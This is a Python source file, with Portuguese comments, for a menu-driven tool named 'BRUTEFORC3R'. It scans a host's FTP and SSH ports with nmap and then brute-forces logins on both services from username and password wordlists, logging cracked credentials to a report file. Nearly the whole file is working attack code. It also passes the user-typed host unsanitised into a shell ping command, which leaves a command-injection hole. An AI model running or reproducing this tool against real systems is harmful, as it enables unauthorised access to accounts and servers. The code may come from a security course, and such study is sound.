import ftplib
import socket
import paramiko
import datetime
import os
import nmap
import pyfiglet

scanner = nmap.PortScanner()
data = datetime.datetime.now()

def change_hostname(): #função para mudança da variável host
    host_prompt = input("Introduza host: ")
    host = str(host_prompt)
    return host

def limpar_terminal():  #função de qol
    os.system("clear")

def prompt_menu():  #função de qol
    escolha = int(input("Escolha uma das seguintes opções: "))
    return escolha


def hud_menu(host,port_ftp,port_ssh): #Parte superior do menu inicial, no qual podemos observar os detalhes relativos ao host, portas e dicionarios escolhidos
    os.system("clear")
    print(pyfiglet.figlet_format("BRUTEFORC3R"))
    print(f"HOST: {host} (0 to change)| Porta FTP: {port_ftp} (8 to change)| Porta SSH: {port_ssh} (9 to change) | "
          f"Dicionários: path/user.txt | path/pass.txt")
    print("--------------------------------------------------------------------------")
    print("1) ICMP/NMAP Scan")
    print("2) FTP Bruteforce")
    print("3) SSH Bruteforce")

def menu_else(): #função para garantir que o user introduza somente os inputs
    os.system("clear")
    print("""Erro - Introduza uma das opções disponíveis\nPressione enter para continuar""")
    input()

def ping(host): #função que pinga o ip definido em host para garantir a conectividade antes do NMAP
    print("Testado a conexão ao host:")
    try:
        if os.system(f"ping -c 2 {host}") == 0:
            print("--------------------------\n [!]Conexão ICMP feita com sucesso[!]\n --------------------------")
            return True
        elif os.system(f"ping -c 2 {host}") != 0:
            print("[!]Impossível realizar conexão ICMP[!]")
            return False
    except KeyboardInterrupt:
        return


def change_ftp_port(): #função para mudança porta serviço FTP
    try:
        ftp_port_prompt = int(input("Introduza porta FTP: "))
        port_ftp = ftp_port_prompt
    except ValueError:
        print("ERRO - Introduza um valor númerico")
    except KeyboardInterrupt:
        return
    return port_ftp

def change_ssh_port(): #função para mudança porta serviço FTP
    try:
        ssh_port_prompt = int(input("Introduza porta SSH: "))
        port_ssh = ssh_port_prompt
    except ValueError:
        print("ERRO - Introduza um valor númerico")
    except KeyboardInterrupt:
        return
    return port_ssh


def portscan(host, port_ftp, port_ssh): #função Nmap, aproveita o módulo Nmap para apresentar resultado da porta, nome do serviço e estado (aberto/fechado)
    print("NMAP Scan")
    portas = port_ftp, port_ssh
    for i in portas:
        try:
            resultado = scanner.scan(host, str(i))
            state = resultado['scan'][host]['tcp'][i]['state']
            service = resultado['scan'][host]['tcp'][i]['name']
            product = resultado['scan'][host]['tcp'][i]['product']
            print(f"Porta: {i} | Serviço: {service} {product} | Estado: {state} ")
        except KeyError:
            print("Host unreacheable - pressione enter para continuar")
            input()
            return
        except KeyboardInterrupt:
            return
    print("Pressione enter para continuar")
    input()
    return


def ftp(host, port_ftp, user, passw): #função bruteforce ftp, utilizando o módulo ftplib
    print(pyfiglet.figlet_format("FTP BRUTE")) #utilização do módulo pyfiglet para tornar o programa mais apelativo
    tries = 0  # Contador para garantir que o loop acaba após todas as combinações users/passwd
    while tries < ((len(user)) * len(passw)):
        server = ftplib.FTP()
        lista_report = []  # Lista para a qual vão todos os registos[falhas e sucessos]
        f = open('report.txt', 'a')  # criação do ficheiro de destino (report.txt) com parâmetro a - append
        f.write(f"\nData report: {str(data)} | FTP Bruteforce | Host: {host} \n") # estrutura do txt de report
        for j in range(len(user)):
            for i in range(len(passw)):
                tries += 1
                try: #utiliza o server.connect e server.login para a conexão
                    server.connect(host, port_ftp, timeout=5)
                    server.login(user[j], passw[i])
                except ftplib.error_perm: #imprime para o ecra(e report .txt) a informação das combinações user/pw falhadas
                    print(f"[Failed] User: {user[j]} | Password: {passw[i]}")
                    lista_report.append([f"[Failed] User: {user[j]} | Password: {passw[i]}"])
                    if tries >= ((len(user)) * len(passw)): #através do cálculo do total de combinações possíveis é possível acabar o loop
                        print("-----------")
                        print("Não foi possível fazer bruteforce com a wordlist atual")
                        print("Pressione enter para continuar")
                        input()
                        return
                except (socket.timeout, ConnectionRefusedError): #alerta o user no caso da existência de erros de conexão
                    print("Serviço FTP indisponível | Verificar estado da porta com Nmap")
                    print("Pressione enter para continuar")
                    input()
                    return
                except KeyboardInterrupt: #permite ao utilizador interromper o processo de FTP Bruteforce
                    return
                else:
                    print("------------------------------")
                    print(
                        f"[Success] User: {user[j]} | Password: {passw[i]} | Host: {host}\nPressione enter para " #No caso da conexão não apresentar erros, assume-se como bem sucedida.
                        f"continuar")
                    lista_report.append([f"[Success] User: {user[j]} | Password: {passw[i]}"])
                    for z in range(len(lista_report)):
                        f.write(str(lista_report[z])), f.write("\n") #escreve no report a combinação bem sucedida
                    input()
                    return
        f.close()


def ssh(host, port_ssh, user, passw):
    print(pyfiglet.figlet_format("SSH BRUTE"))  #utilização do módulo pyfiglet para tornar o programa mais apelativo
    s = paramiko.SSHClient() #utilização do módulo Paramiko.SSHClient que permite estabelecer comunicações SSH
    s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    s.load_system_host_keys()

    lista_report = []  # Lista para a qual vão todos os registos[falhas e sucessos]
    f = open('report.txt', 'a')  # criação do ficheiro de destino (report.txt) com parâmetro a - append
    f.write(f"Data report: {str(data)} | SSH Bruteforce | Host: {host} \n") # estrutura do txt de report
    tries = 0
    while tries < ((len(user)) * len(passw)): 
        for j in range(len(user)):
            for i in range(len(passw)):
                tries += 1
                try: #utiliza o s.connect para a conexão 
                    s.connect(host, port=port_ssh, username=user[j], password=passw[i], timeout=1, allow_agent=False,
                              look_for_keys=False)
                except paramiko.AuthenticationException as e: #imprime para o ecra(e report .txt) a informação das combinações user/pw falhadas
                    print(f"[Failed] User: {user[j]} | Password: {passw[i]}")
                    lista_report.append([f"[Failed] User: {user[j]} | Password: {passw[i]}"])
                    if tries >= ((len(user)) * len(passw)):  #através do cálculo do total de combinações possíveis é possível acabar o loop
                        print("-----------") 
                        print("Não foi possível fazer bruteforce com a wordlist atual")
                        print("Pressione enter para continuar")
                        input()
                        return
                except (socket.timeout, paramiko.ssh_exception.NoValidConnectionsError): #alerta o user no caso da existência de erros de conexão
                    print("Serviço SSH indisponível | Verificar estado da porta com Nmap")
                    print("Pressione enter para continuar")
                    input()
                    return
                except KeyboardInterrupt: #permite ao utilizador interromper o processo de SSH Bruteforce
                    return
                else: #No caso da conexão não apresentar erros, assume-se como bem sucedida.
                    print("------------------------------")
                    print(
                        f"[Success] User: {user[j]} | Password: {passw[i]} | Host: {host}\nPressione enter para "
                        f"continuar")
                    lista_report.append([f"[Success] User: {user[j]} | Password: {passw[i]}"]) #escreve no report a combinação bem sucedida
                    for z in range(len(lista_report)):
                        f.write(str(lista_report[z])), f.write("\n")
                    input()
                    return
